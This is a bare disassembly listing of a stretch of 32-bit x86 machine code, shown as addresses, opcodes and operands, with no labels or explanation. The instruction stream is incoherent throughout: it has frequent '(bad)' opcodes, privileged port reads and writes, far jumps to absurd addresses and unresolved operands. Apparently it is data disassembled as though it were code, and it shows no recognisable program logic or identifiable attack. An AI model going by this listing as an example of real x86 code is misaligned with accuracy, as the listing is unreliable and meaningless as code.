  4166b8:	dec    edi
  4166b9:	mov    WORD PTR [ebp+edx*8+0x66ffbedf],cs
  4166c0:	mov    al,0xd
  4166c2:	shl    DWORD PTR gs:[esi],0xd2
  4166c6:	push   cs
  4166c7:	std    
  4166c8:	mov    edi,0x9df07685
  4166cd:	mov    dl,0xa9
  4166cf:	rcl    BYTE PTR [esi+0x4e95dfbd],0x45
  4166d6:	mov    eax,ds:0x28db2920
  4166db:	fs ja  0x416756
  4166de:	cdq    
  4166df:	popf   
  4166e0:	cld    
  4166e1:	add    BYTE PTR [eax+eiz*4],dl
  4166e4:	in     al,0xfd
  4166e6:	arpl   WORD PTR ds:0xd71b1b50,si
  4166ec:	in     eax,0xc6
  4166ee:	cwde   
  4166ef:	in     al,0xbf
  4166f1:	xor    DWORD PTR [esi],ebp
  4166f3:	jecxz  0x41667d
  4166f5:	cmc    
  4166f6:	xchg   BYTE PTR [esi-0x35],bl
  4166f9:	jns    0x41667d
  4166fb:	out    0x46,eax
  4166fd:	add    dh,BYTE PTR [edx-0x29]
  416700:	push   esi
  416701:	sub    bl,BYTE PTR [ecx]
  416703:	ret    
  416704:	out    0x8d,al
  416706:	aaa    
  416707:	xchg   DWORD PTR [ecx-0x62c70645],ecx
  41670d:	dec    edx
  41670e:	mov    bl,0x7
  416710:	inc    ebp
  416711:	mov    DWORD PTR [ebp+0x1ab78874],ebx
  416717:	mov    dl,al
  416719:	test   DWORD PTR [ecx+0x1],ebx
  41671c:	mov    cl,BYTE PTR [edi+0x43]
  41671f:	fdiv   QWORD PTR [ecx+0x79d609ca]
  416725:	dec    ecx
  416726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416727:	ror    DWORD PTR [edi+0x23109605],0x4e
  41672e:	repnz sbb esi,esp
  416731:	push   ebx
  416732:	push   ds
  416733:	loope  0x4166cd
  416735:	int3   
  416736:	push   ss
  416737:	repnz sbb BYTE PTR [edx],ch
  41673a:	mov    ecx,0xed5bcdd2
  41673f:	inc    esp
  416740:	dec    esi
  416741:	pop    es
  416742:	mov    al,0xca
  416744:	mov    edi,0xe511f2c
  416749:	mov    WORD PTR [ebx-0x37],gs
  41674c:	bound  edx,QWORD PTR [esi]
  41674e:	xlat   BYTE PTR ds:[ebx]
  41674f:	aad    0xbd
  416751:	je     0x41670a
  416753:	mov    dh,0x45
  416755:	jmp    FWORD PTR [ebp-0xb]
  416758:	mov    BYTE PTR [ecx+0x61],ah
  41675b:	cmp    eax,0xa5cbb7b7
  416760:	fdiv   QWORD PTR [edx]
  416762:	stc    
  416763:	aam    0x15
  416765:	push   ecx
  416766:	mov    dh,BYTE PTR [esi]
  416768:	jne    0x4166f3
  41676a:	dec    eax
  41676b:	repz xchg ch,al
  41676e:	outs   dx,BYTE PTR ds:[esi]
  41676f:	aaa    
  416770:	or     BYTE PTR [eax+0x1f],dl
  416773:	dec    ebp
  416774:	scas   al,BYTE PTR es:[edi]
  416775:	lahf   
  416776:	inc    esp
  416777:	aam    0x51
  416779:	daa    
  41677a:	rcr    edx,cl
  41677c:	push   eax
  41677d:	sub    bl,al
  41677f:	push   ecx
  416780:	(bad)  
  416781:	stos   DWORD PTR es:[edi],eax
  416782:	js     0x41670b
  416784:	je     0x416784
  416786:	pop    esp
  416787:	ja     0x4167b1
  416789:	lods   eax,DWORD PTR ds:[esi]
  41678a:	das    
  41678b:	out    dx,eax
  41678c:	adc    ecx,DWORD PTR [edx-0x76]
  41678f:	fwait
  416790:	add    al,BYTE PTR [edx-0xed2f691]
  416796:	mov    eax,ds:0x2f8b87a7
  41679b:	sahf   
  41679c:	or     ecx,ebx
  41679e:	add    BYTE PTR [edx-0x3ecf2195],cl
  4167a4:	pusha  
  4167a5:	and    al,0x1a
  4167a7:	test   DWORD PTR [eax-0x15],esp
  4167aa:	fbstp  TBYTE PTR [eax+0x354a74e]
  4167b0:	mov    bl,ah
  4167b2:	mov    ah,0xe
  4167b4:	cld    
  4167b5:	mov    cl,0x34
  4167b7:	test   eax,0xb42405b9
  4167bc:	jo     0x416797
  4167be:	cmp    al,BYTE PTR [edx-0x6f]
  4167c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c2:	gs xchg ecx,eax
  4167c4:	cli    
  4167c5:	sub    eax,0x15cebec3
  4167ca:	in     eax,0x74
  4167cc:	or     DWORD PTR [edx],eax
  4167ce:	inc    edx
  4167cf:	push   es
  4167d0:	es into 
  4167d2:	arpl   WORD PTR [edx],di
  4167d4:	pop    eax
  4167d5:	cmp    ebx,DWORD PTR [edi]
  4167d7:	out    0xe7,eax
  4167d9:	pop    edx
  4167da:	sub    al,0x8a
  4167dc:	in     al,0xd1
  4167de:	xor    esp,edx
  4167e0:	fucom  st(7)
  4167e2:	mov    ah,ch
  4167e4:	sbb    ah,BYTE PTR [edx-0x54763960]
  4167ea:	cwde   
  4167eb:	xchg   ecx,eax
  4167ec:	push   eax
  4167ed:	ror    al,1
  4167ef:	call   0xe3cd6aad
  4167f4:	mov    WORD PTR [edi+0x60],es
  4167f7:	test   eax,0x891f25e1
  4167fc:	(bad)  
  4167fd:	stc    
  4167fe:	sbb    DWORD PTR [ecx],0xd4a5ac38
  416804:	adc    DWORD PTR [esi+ebx*1],ebp
  416807:	(bad)  
  416808:	adc    al,0xa2
  41680a:	or     DWORD PTR [ecx-0x2fbabe77],esi
  416810:	and    ch,BYTE PTR [edx+0x77]
  416813:	sbb    BYTE PTR [ecx+0x7fe60c26],0x32
  41681a:	ins    DWORD PTR es:[edi],dx
  41681b:	xor    eax,0x6c4c26c
  416820:	pop    ecx
  416821:	xchg   ebx,eax
  416822:	pop    ds
  416823:	shl    esi,1
  416825:	out    0xeb,eax
  416827:	daa    
  416828:	mov    al,ds:0xd5d49777
  41682d:	pop    esp
  41682e:	sbb    BYTE PTR [edx+ecx*8-0x45],0x72
  416833:	mov    edi,0xeb612d71
  416838:	enter  0xabbd,0x1d
  41683c:	test   al,0x48
  41683e:	out    dx,al
  41683f:	cld    
  416840:	and    ecx,DWORD PTR [ebx+ecx*1]
  416843:	mov    ah,0xe1
  416845:	add    esi,edx
  416847:	sub    al,0x97
  416849:	hlt    
  41684a:	jnp    0xf91c22c8
  416850:	mov    BYTE PTR [ebx-0x7c],dh
  416853:	in     al,dx
  416854:	(bad)  
  416855:	pusha  
  416856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416857:	inc    ebx
  416858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416859:	push   ebp
  41685a:	add    al,0xd3
  41685c:	int    0x2
  41685e:	fadd   QWORD PTR [edi+eax*4-0x35]
  416862:	jmp    0x1fbd9e48
  416867:	pop    ss
  416868:	xchg   ebx,eax
  416869:	and    BYTE PTR [ebx],0x84
  41686c:	in     eax,0x88
  41686e:	stos   DWORD PTR es:[edi],eax
  41686f:	jl     0x416805
  416871:	je     0x416853
  416873:	aam    0x7a
  416875:	dec    ecx
  416876:	add    eax,0x60cc1972
  41687b:	ror    DWORD PTR [edi+0x4b6cf1f2],1
  416881:	(bad)  
  416882:	push   esp
  416883:	xchg   ebp,eax
  416884:	(bad)  
  416885:	sub    al,0x36
  416887:	aam    0xae
  416889:	ja     0x41683f
  41688b:	call   0x6a76:0xad4dd7aa
  416892:	push   cs
  416893:	scas   al,BYTE PTR es:[edi]
  416894:	aad    0xb9
  416896:	daa    
  416897:	push   esp
  416898:	mov    bh,al
  41689a:	out    0x42,eax
  41689c:	mov    ds:0x26d5f948,al
  4168a1:	in     eax,0x52
  4168a3:	mov    esi,DWORD PTR ss:[edx]
  4168a6:	lods   eax,DWORD PTR ds:[esi]
  4168a7:	dec    ebp
  4168a8:	icebp  
  4168a9:	icebp  
  4168aa:	jp     0x416880
  4168ac:	or     DWORD PTR [ebx],esi
  4168ae:	out    dx,al
  4168af:	cmp    BYTE PTR ds:0x3b1c192a,ch
  4168b5:	or     ebx,DWORD PTR [edx+0x17ef884f]
  4168bb:	add    BYTE PTR [esi],ch
  4168bd:	clc    
  4168be:	push   ds
  4168bf:	and    DWORD PTR [ecx+0x468c1a3f],ecx
  4168c5:	push   ss
  4168c6:	sbb    al,0xdc
  4168c8:	(bad)  
  4168c9:	out    0xfe,al
  4168cb:	aad    0xb5
  4168cd:	dec    edx
  4168ce:	aam    0xf6
  4168d0:	pop    esp
  4168d1:	push   eax
  4168d2:	(bad)  
  4168d3:	mov    cs,WORD PTR [eax+0x7fccf01f]
  4168d9:	mov    ebp,0x3659b4e
  4168de:	mov    esp,0xb82f2732
  4168e3:	les    ebp,FWORD PTR [edi+0x59]
  4168e6:	push   ds
  4168e7:	add    DWORD PTR [ebp+0x5ec31257],0xffffffa8
  4168ee:	cmp    dl,ah
  4168f0:	jp     0x416970
  4168f2:	dec    esi
  4168f3:	rcl    eax,1
  4168f5:	jo     0x4168c2
  4168f7:	cld    
  4168f8:	stc    
  4168f9:	xchg   BYTE PTR [edi],bl
  4168fb:	mov    edi,0xb34b446d
  416900:	and    cl,cl
  416902:	xchg   esi,eax
  416903:	aad    0x38
  416905:	rol    BYTE PTR [esi+edx*4+0x7c],cl
  416909:	imul   ebp,DWORD PTR [edx],0x6ad873e
  41690f:	out    0x37,eax
  416911:	in     al,dx
  416912:	jg     0x416911
  416914:	sbb    DWORD PTR [esi+0x354c055],esp
  41691a:	js     0x416995
  41691c:	and    esi,DWORD PTR [ecx-0x42]
  41691f:	dec    esp
  416920:	dec    ebx
  416921:	jg     0x416986
  416923:	arpl   WORD PTR [edx],bp
  416925:	push   esi
  416926:	mov    ebp,0xfdc25fd0
  41692b:	and    dh,BYTE PTR [ebx+0x2]
  41692e:	pop    esp
  41692f:	add    al,0xe8
  416931:	scas   al,BYTE PTR es:[edi]
  416932:	lds    ebp,FWORD PTR [esi-0x1e]
  416935:	mov    al,ds:0xc696a160
  41693a:	add    al,0x5b
  41693c:	ins    BYTE PTR es:[edi],dx
  41693d:	push   0x95f3d4ec
  416942:	dec    eax
  416943:	pop    edx
  416944:	or     bh,BYTE PTR [esi]
  416946:	cmp    BYTE PTR [ebp+0x331969a5],cl
  41694c:	mov    BYTE PTR [edi+0xb],ah
  41694f:	mov    ebx,0xcbca8e01
  416954:	test   BYTE PTR [edx],0xc8
  416957:	pusha  
  416958:	js     0x4169d7
  41695a:	shl    BYTE PTR [edi+edx*8-0x767df31a],cl
  416961:	pop    ss
  416962:	(bad)  
  416963:	fld    TBYTE PTR [esi+0xaed6772]
  416969:	ficom  WORD PTR [esi+edx*8+0x63]
  41696d:	or     edi,DWORD PTR [edx]
  41696f:	ror    dl,0x60
  416972:	jmp    0x63312e53
  416977:	imul   esi,DWORD PTR [ebp+0x65],0x23
  41697b:	add    eax,0x62e9b5a6
  416980:	leave  
  416981:	push   ecx
  416982:	ret    0xc6dc
  416985:	add    eax,0xa6fbb916
  41698a:	xor    DWORD PTR [eax-0x1e],ebp
  41698d:	iret   
  41698e:	outs   dx,BYTE PTR ds:[esi]
  41698f:	mov    bh,0x60
  416991:	les    esp,FWORD PTR [ecx-0x3fb4f48d]
  416997:	rol    al,cl
  416999:	aaa    
  41699a:	xlat   BYTE PTR cs:[ebx]
  41699c:	xchg   ebx,eax
  41699d:	xor    al,BYTE PTR [ebx]
  41699f:	nop
  4169a0:	rcl    BYTE PTR [ebx+0x43538ffc],1
  4169a6:	fimul  DWORD PTR [esi+eax*4+0x2d]
  4169aa:	jecxz  0x4169cb
  4169ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ad:	popf   
  4169ae:	lahf   
  4169af:	push   0x48
  4169b1:	div    DWORD PTR [edx]
  4169b3:	xlat   BYTE PTR ds:[ebx]
  4169b4:	inc    ebp
  4169b5:	or     al,0x1b
  4169b7:	sahf   
  4169b8:	or     eax,0x89c1647f
  4169bd:	ret    
  4169be:	jbe    0x416a25
  4169c0:	sub    ebx,DWORD PTR [ebp+0x46801ed8]
  4169c6:	or     bl,dh
  4169c8:	inc    edx
  4169c9:	add    esp,DWORD PTR [edi+edi*8]
  4169cc:	data16 (bad) 
  4169ce:	sub    eax,0x2ffb86bb
  4169d3:	shl    BYTE PTR [edx-0x49599f5e],1
  4169d9:	fsub   QWORD PTR [edi-0x2b]
  4169dc:	nop
  4169dd:	jmp    0x4169ea
  4169df:	push   esp
  4169e0:	jns    0x4169a3
  4169e2:	mov    bl,dl
  4169e4:	mov    BYTE PTR [edi],dl
  4169e6:	push   esi
  4169e7:	shl    DWORD PTR [ecx],0x63
  4169ea:	pop    ss
  4169eb:	push   esi
  4169ec:	stos   BYTE PTR es:[edi],al
  4169ed:	and    al,0xec
  4169ef:	or     BYTE PTR [ecx],dl
  4169f1:	fwait
  4169f2:	cld    
  4169f3:	mov    al,0xc8
  4169f5:	addr16 pop edx
  4169f7:	pop    ss
  4169f8:	scas   eax,DWORD PTR es:[edi]
  4169f9:	mov    bl,0x60
  4169fb:	mov    bl,0xaa
  4169fd:	or     DWORD PTR [edi*2-0x3ef20827],ebp
  416a04:	push   ebp
  416a05:	add    dh,BYTE PTR [ebx+esi*4]
  416a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a09:	lahf   
  416a0a:	scas   al,BYTE PTR es:[edi]
  416a0b:	in     al,dx
  416a0c:	fs xchg ecx,eax
  416a0e:	ins    DWORD PTR es:[edi],dx
  416a0f:	pop    ds
  416a10:	and    BYTE PTR [esi-0x30],bh
  416a13:	jp     0x41699c
  416a15:	ins    DWORD PTR es:[edi],dx
  416a16:	lahf   
  416a17:	scas   al,BYTE PTR es:[edi]
  416a18:	pusha  
  416a19:	or     BYTE PTR [edi-0x14b78556],dl
  416a1f:	call   0x12710ca9
  416a24:	pop    ss
  416a25:	imul   ebx,DWORD PTR [edi],0x774da15b
  416a2b:	addr16 push 0xa1d67320
  416a31:	cmp    BYTE PTR [ebp+ebp*1-0x48],dl
  416a35:	sbb    DWORD PTR [edx-0x7418d735],edx
  416a3b:	sub    eax,0x9261bb8a
  416a40:	inc    ecx
  416a41:	pop    edx
  416a42:	inc    esi
  416a43:	pop    ebx
  416a44:	arpl   WORD PTR [ecx+0xc18ffa0],dx
  416a4a:	push   ecx
  416a4b:	shr    DWORD PTR [edi],cl
  416a4d:	fld    st(1)
  416a4f:	inc    esi
  416a50:	push   ebp
  416a51:	sub    edi,edi
  416a53:	push   ds
  416a54:	push   es
  416a55:	popa   
  416a56:	ss inc edi
  416a58:	pop    esp
  416a59:	xchg   DWORD PTR [edx+0x3],ebp
  416a5c:	or     eax,edx
  416a5e:	dec    esi
  416a5f:	push   edi
  416a60:	mov    BYTE PTR [eax+0x10],ah
  416a63:	int3   
  416a64:	xchg   edx,eax
  416a65:	add    eax,0xce1c046e
  416a6a:	into   
  416a6b:	call   0x4a52:0x871f93a0
  416a72:	jb     0x416a2c
  416a74:	mov    ds:0x74b229be,al
  416a79:	lahf   
  416a7a:	loopne 0x416a50
  416a7c:	stos   BYTE PTR es:[edi],al
  416a7d:	test   BYTE PTR [esp+ebx*2-0x4c],0xca
  416a82:	pop    ds
  416a83:	or     esi,DWORD PTR [eax+0x3c]
  416a86:	sbb    DWORD PTR [eax+esi*2-0x5938d205],ebx
  416a8d:	add    al,BYTE PTR [eax-0x4a]
  416a90:	pop    ebx
  416a91:	(bad)  
  416a93:	bound  esp,QWORD PTR [ebx]
  416a95:	mov    bh,0x8f
  416a97:	dec    eax
  416a98:	mov    fs,WORD PTR [ecx-0x37]
  416a9b:	mov    DWORD PTR [edx],edx
  416a9d:	pop    edi
  416a9e:	push   ss
  416a9f:	or     al,0x89
  416aa1:	pop    esp
  416aa2:	xor    ch,BYTE PTR [edx]
  416aa4:	add    ch,BYTE PTR es:[esi-0x255e18a6]
  416aab:	imul   ebx,DWORD PTR [ecx],0x45
  416aae:	popa   
  416aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ab0:	dec    ebx
  416ab1:	(bad)  
  416ab2:	out    0xff,eax
  416ab4:	or     DWORD PTR [ecx+0x3f],0xe21d15cc
  416abb:	or     BYTE PTR [edi+ebp*4+0x51481467],al
  416ac2:	xchg   DWORD PTR [edi+0x5c4f47b3],esi
  416ac8:	pop    es
  416ac9:	mul    DWORD PTR [edi+edi*1]
  416acc:	dec    eax
  416acd:	aam    0x7
  416acf:	fwait
  416ad0:	outs   dx,DWORD PTR ds:[esi]
  416ad1:	add    edx,esi
  416ad3:	mov    WORD PTR [esp],?
  416ad6:	test   eax,0x68395688
  416adb:	imul   edx,DWORD PTR [edx],0xffffff84
  416ade:	sbb    DWORD PTR [edi+0x9],edx
  416ae1:	or     DWORD PTR [edx],ecx
  416ae3:	call   0x75096cf4
  416ae8:	call   0x3b818510
  416aed:	ret    
  416aee:	pop    ds
  416aef:	ret    
  416af0:	jecxz  0x416b34
  416af2:	mov    dh,0x19
  416af4:	jge    0x416ac9
  416af6:	jge    0x416a7c
  416af8:	sbb    eax,DWORD PTR [ecx]
  416afa:	inc    esp
  416afb:	jmp    0x416b2c
  416afd:	lea    eax,[edx+0x0]
  416b00:	mov    esi,0x8cac9fc2
  416b05:	arpl   WORD PTR [ebp+0x79],bp
  416b08:	dec    ecx
  416b09:	and    al,0x3
  416b0b:	adc    al,0x3a
  416b0d:	lahf   
  416b0e:	push   es
  416b0f:	mov    ch,0xd4
  416b11:	gs push 0xf4cc86e
  416b17:	mov    ah,0xe7
  416b19:	shl    BYTE PTR [eax+0x7f],1
  416b1c:	jmp    0x416b2e
  416b1e:	push   0x6
  416b20:	test   DWORD PTR [ebx],ebx
  416b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b23:	enter  0x1b80,0x24
  416b27:	add    dl,BYTE PTR [ecx]
  416b29:	mov    bh,0xf8
  416b2b:	aad    0x37
  416b2d:	pop    edx
  416b2e:	rol    DWORD PTR [esi-0x79],cl
  416b31:	mov    esi,ebx
  416b33:	sub    eax,0xd5947949
  416b38:	pop    eax
  416b39:	mov    ecx,0x2a1e7ed6
  416b3e:	cmp    ch,BYTE PTR [edx+0xf0c419]
  416b44:	mov    ebx,edx
  416b46:	cmp    al,0x4b
  416b48:	jae    0x416b14
  416b4a:	out    0x76,eax
  416b4c:	adc    al,0x1d
  416b4e:	add    BYTE PTR [ebx],dl
  416b50:	sbb    eax,0x98d1cdee
  416b55:	pushf  
  416b56:	nop
  416b57:	push   0xfffffff5
  416b59:	mov    ebp,ebp
  416b5b:	aam    0x83
  416b5d:	xchg   ebp,eax
  416b5e:	mov    DWORD PTR [edx],0xd4973892
  416b64:	fstp   DWORD PTR [edi+0x1c]
  416b67:	adc    eax,ecx
  416b69:	lea    ebx,[ebx]
  416b6b:	cld    
  416b6c:	repz sbb ebx,DWORD PTR [ebx]
  416b6f:	xlat   BYTE PTR ds:[ebx]
  416b70:	xchg   esi,eax
  416b71:	adc    dh,BYTE PTR [edx-0x20]
  416b74:	or     ah,BYTE PTR [esi]
  416b76:	mov    ds:0x9046d1d4,al
  416b7b:	jge    0x416be8
  416b7d:	xchg   edi,eax
  416b7e:	jmp    0xc804:0xdc599561
  416b85:	sbb    ebx,eax
  416b87:	call   0x3fb96e05
  416b8c:	sub    dh,BYTE PTR [eax+0x6e942e5e]
  416b92:	push   ds
  416b93:	cmp    eax,0x6f493c81
  416b98:	push   es
  416b99:	xor    BYTE PTR [esi+0xf52a0d5],ch
  416b9f:	cmp    DWORD PTR [edx-0x7626ed8c],eax
  416ba5:	sbb    eax,0x5c65d2f6
  416baa:	clc    
  416bab:	(bad)  
  416bac:	dec    edi
  416bad:	add    edx,esp
  416baf:	inc    edx
  416bb0:	ja     0x416b7c
  416bb2:	leave  
  416bb3:	add    bl,BYTE PTR [ecx+0xa]
  416bb6:	pop    ds
  416bb7:	lods   eax,DWORD PTR ds:[esi]
  416bb8:	out    dx,eax
  416bb9:	retf   
  416bba:	cmp    bh,BYTE PTR [edi]
  416bbc:	inc    esp
  416bbd:	cmp    eax,0x2b0cd40f
  416bc2:	mov    BYTE PTR [esi+edi*1+0x5],cl
  416bc6:	sub    BYTE PTR [edi+0x7a01b788],0x46
  416bcd:	test   edx,0xa272b2ce
  416bd3:	out    dx,al
  416bd4:	(bad)  
  416bd5:	das    
  416bd6:	fwait
  416bd7:	emms   
  416bd9:	in     al,dx
  416bda:	inc    eax
  416bdb:	ds cwde 
  416bdd:	lahf   
  416bde:	pusha  
  416bdf:	cmc    
  416be0:	pop    ecx
  416be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be2:	mov    ah,0x40
  416be4:	fcom   DWORD PTR [edi-0x482c2d97]
  416bea:	dec    edi
  416beb:	vpaddusw xmm3,xmm0,XMMWORD PTR [edi-0x78]
  416bf0:	popa   
  416bf1:	adc    DWORD PTR [ebp+0x631d098d],0xffffffdd
  416bf8:	rcr    BYTE PTR [eax],1
  416bfa:	xchg   ebp,eax
  416bfb:	in     al,0x90
  416bfd:	sbb    al,0xb6
  416bff:	lods   eax,DWORD PTR ds:[esi]
  416c00:	cmp    ecx,DWORD PTR [edi]
  416c02:	pop    ecx
  416c03:	xchg   edi,eax
  416c04:	add    eax,0xabdd6086
  416c09:	repz cmp eax,0x810bc824
  416c0f:	aam    0xb8
  416c11:	repnz or ebp,eax
  416c14:	je     0x416be7
  416c16:	cmp    eax,0xae8789c3
  416c1b:	push   es
  416c1c:	sbb    DWORD PTR [bp+di-0x3b2],edi
  416c21:	or     bl,BYTE PTR [edi-0x2c]
  416c24:	stos   DWORD PTR es:[edi],eax
  416c25:	adc    esi,ebp
  416c27:	ret    0x51f4
  416c2a:	test   eax,0xc8a3d533
  416c2f:	adc    DWORD PTR [ebp+0x27bbf6b5],edx
  416c35:	and    BYTE PTR [esi+esi*8-0x2a98d062],0x1b
  416c3d:	adc    DWORD PTR [ecx+eax*2],eax
  416c40:	clc    
  416c41:	push   ebx
  416c42:	stos   BYTE PTR es:[edi],al
  416c43:	fnsave [eax-0x764775f9]
  416c49:	mov    bh,0xdd
  416c4b:	push   ecx
  416c4c:	sub    al,0x3f
  416c4e:	dec    edx
  416c4f:	aam    0xa3
  416c51:	jmp    0xa0f8:0xb0f2bea
  416c58:	mov    BYTE PTR [ebp+0x49b0e3d2],cl
  416c5e:	xor    bh,BYTE PTR [edx+ebx*1+0x49]
  416c62:	push   0x1a02b383
  416c67:	fstp   TBYTE PTR [edx-0x48f495bd]
  416c6d:	fistp  DWORD PTR [esi-0x34687650]
  416c73:	ins    DWORD PTR es:[edi],dx
  416c74:	sub    eax,0xd343e63a
  416c79:	arpl   WORD PTR [esi],bx
  416c7b:	int    0x39
  416c7d:	data16 (bad) 
  416c7f:	mov    bl,0x93
  416c81:	push   edx
  416c82:	fwait
  416c83:	push   ecx
  416c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c85:	add    bh,bl
  416c87:	out    0xe4,eax
  416c89:	mov    ecx,0x1d4e1aeb
  416c8e:	fs pop edi
  416c90:	js     0x416cc2
  416c92:	sbb    bh,BYTE PTR [edx]
  416c94:	enter  0xa780,0xdc
  416c98:	ja     0x416d16
  416c9a:	pop    ds
  416c9b:	fistp  QWORD PTR [ecx-0x17d12829]
  416ca1:	jge    0x416cba
  416ca3:	stos   BYTE PTR es:[edi],al
  416ca4:	mov    edi,0xdc0ceb5c
  416ca9:	sbb    al,0x6d
  416cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cac:	sub    ecx,esp
  416cae:	sbb    dl,BYTE PTR [edx]
  416cb0:	inc    esp
  416cb1:	test   DWORD PTR [edi],ebx
  416cb3:	test   eax,0x15127f30
  416cb8:	or     DWORD PTR [ebx-0x6d67096a],0xffffff91
  416cbf:	jmp    0x416c49
  416cc1:	lods   eax,DWORD PTR ds:[esi]
  416cc2:	pop    eax
  416cc3:	xchg   esp,eax
  416cc4:	inc    eax
  416cc5:	mov    eax,0xbd896651
  416cca:	inc    edi
  416ccb:	not    BYTE PTR [eax+esi*4-0x7ac4e699]
  416cd2:	or     eax,0x96df11a1
  416cd7:	popf   
  416cd8:	(bad)  
  416cd9:	fcos   
  416cdb:	mov    esi,0x5220e917
  416ce0:	out    0x39,al
  416ce2:	push   ds
  416ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ce4:	sahf   
  416ce5:	frstor [ecx+0x50]
  416ce8:	fidiv  DWORD PTR [esi-0xe7e2bd4]
  416cee:	sub    dh,BYTE PTR [ebx+0x71]
  416cf1:	std    
  416cf2:	ret    
  416cf3:	xchg   eax,esi
  416cf5:	jmp    0x416cc3
  416cf7:	aad    0x37
  416cf9:	ins    DWORD PTR es:[edi],dx
  416cfa:	stos   DWORD PTR es:[edi],eax
  416cfb:	jae    0x416ca1
  416cfd:	(bad)  
  416cfe:	rcl    ch,1
  416d00:	xchg   BYTE PTR [esi],cl
  416d02:	push   ebp
  416d03:	lahf   
  416d04:	mul    BYTE PTR [edi+eax*8-0x6dc700f]
  416d0b:	pop    ecx
  416d0c:	jno    0x416d77
  416d0e:	xor    al,0x94
  416d10:	ret    0x8633
  416d13:	aam    0x5
  416d15:	adc    eax,0xa0f74411
  416d1a:	sub    eax,0xba7788a6
  416d1f:	or     BYTE PTR [ecx+0x11ac1ff7],al
  416d25:	cmp    BYTE PTR es:[edi+ebp*1+0x5],dl
  416d2a:	mov    al,ds:0x692c1832
  416d2f:	imul   esi,DWORD PTR [edi-0x773d4789],0xffffffa9
  416d36:	xor    eax,ebp
  416d38:	stos   DWORD PTR es:[edi],eax
  416d39:	and    DWORD PTR [esi-0x26f7fb3e],ebp
  416d3f:	aad    0x3a
  416d41:	push   ebx
  416d42:	push   0xdb4b1ea8
  416d47:	ss test eax,0x56f1e3c
  416d4d:	cdq    
  416d4e:	in     al,0x94
  416d50:	nop
  416d51:	dec    ebx
  416d52:	mov    dh,0xd4
  416d54:	push   0x15
  416d56:	leave  
  416d57:	clc    
  416d58:	push   ecx
  416d59:	(bad)  
  416d5a:	ds js  0x32546536
  416d61:	xor    DWORD PTR [ebx+eax*2+0x698c4b94],esi
  416d68:	rcr    DWORD PTR [edi+0x42adcae4],1
  416d6e:	push   ds
  416d6f:	or     al,0xfa
  416d71:	lea    ebx,[edi]
  416d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d74:	jmp    0xed7f:0x5829236d
  416d7b:	aad    0x56
  416d7d:	mov    ds:0x88bb248e,al
  416d82:	shr    DWORD PTR ds:0xfccad3b4,0x89
  416d89:	leave  
  416d8a:	cmp    eax,0xfd79ea7b
  416d8f:	aam    0x10
  416d91:	inc    eax
  416d92:	sbb    DWORD PTR [ecx+0x63eff7b1],ebx
  416d98:	mov    WORD PTR [ebp+0x38ad7dd9],?
  416d9e:	pop    esp
  416d9f:	push   esp
  416da0:	enter  0x2360,0xa6
  416da4:	retf   0x5987
  416da7:	and    BYTE PTR [ecx-0x7baa3003],cl
  416dad:	xchg   ebx,eax
  416dae:	mov    ax,ds:0xfc90d7e6
  416db4:	xchg   BYTE PTR [ebp-0x8cbbdaa],ah
  416dba:	xchg   edx,eax
  416dbb:	adc    DWORD PTR [edi],edx
  416dbd:	add    al,BYTE PTR [esi+ecx*2]
  416dc0:	mov    bl,0x92
  416dc2:	aam    0x38
  416dc4:	sub    dh,BYTE PTR [edi+ebx*1+0x755337d7]
  416dcb:	push   ebp
  416dcc:	sbb    dl,ah
  416dce:	mov    ecx,0xfbc851d7
  416dd3:	ror    BYTE PTR [esi+0xc],1
  416dd6:	gs cmc 
  416dd8:	jg     0x416d5b
  416dda:	pusha  
  416ddb:	imul   edi,esp,0x1eabd195
  416de1:	test   BYTE PTR [ecx],dh
  416de3:	xlat   BYTE PTR ds:[ebx]
  416de4:	test   eax,0x4acc3c4
  416de9:	arpl   WORD PTR [esi+ebx*2-0x78],bx
  416ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dee:	into   
  416def:	push   es
  416df0:	mov    eax,ds:0x20a1a018
  416df5:	add    bl,BYTE PTR [esi+0x6e]
  416df8:	xchg   esi,eax
  416df9:	mov    eax,ds:0x82434bf4
  416dfe:	sahf   
  416dff:	addr16 mov dl,0x2
  416e02:	dec    esi
  416e03:	mov    al,ds:0x636fd9af
  416e08:	push   0xff114003
  416e0d:	mov    ds:0xa2d6aa48,eax
  416e12:	pusha  
  416e13:	or     eax,0xed469d13
  416e18:	test   al,0x74
  416e1a:	jns    0x416df0
  416e1c:	jmp    0xd22b:0xe0e623c5
  416e23:	fisttp DWORD PTR [eax+0x1fcb6747]
  416e29:	icebp  
  416e2a:	jb     0x416e38
  416e2c:	pushf  
  416e2d:	icebp  
  416e2e:	into   
  416e2f:	aam    0x2f
  416e31:	mov    ?,WORD PTR ds:0x81989806
  416e37:	push   ds
  416e38:	mov    bh,bh
  416e3a:	rdmsr  
  416e3c:	jo     0x416e27
  416e3e:	in     al,0xfc
  416e40:	cmp    DWORD PTR [edx],eax
  416e42:	mov    eax,0x8a1e6a82
  416e47:	sub    edi,0xffffffbb
  416e4a:	pusha  
  416e4b:	pop    ebp
  416e4c:	dec    ecx
  416e4d:	fwait
  416e4e:	cli    
  416e4f:	dec    edi
  416e50:	xor    dl,BYTE PTR [edi+ecx*2+0xbe7b3d5]
  416e57:	ret    
  416e58:	pop    eax
  416e59:	dec    ebx
  416e5a:	mov    eax,0x8d758629
  416e5f:	cmp    BYTE PTR [ebp-0x52],dl
  416e62:	and    BYTE PTR [esi],bh
  416e64:	into   
  416e65:	aaa    
  416e66:	jg     0x416e21
  416e68:	cli    
  416e69:	mov    ch,0x76
  416e6b:	add    ecx,DWORD PTR [eax+0x37f4c9d4]
  416e71:	fst    DWORD PTR [edx]
  416e73:	pusha  
  416e74:	mov    ebx,edx
